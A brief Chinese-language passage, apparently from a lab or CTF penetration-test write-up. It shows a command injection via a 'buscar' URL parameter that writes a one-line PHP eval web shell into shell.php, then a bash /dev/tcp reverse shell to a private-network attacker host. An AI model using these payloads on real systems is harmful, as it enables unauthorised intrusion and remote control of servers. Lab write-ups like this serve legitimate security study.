...
## 4.1 一句话木马传入`shell.php`
`http://192.168.203.136/site/busque.php?buscar=echo '<?php eval($_POST["cmd"]); ?>' > shell.php`
...
## 4.4反弹shell
命令注入：`bash -i >& /dev/tcp/192.168.203.129/7777 0>&1`
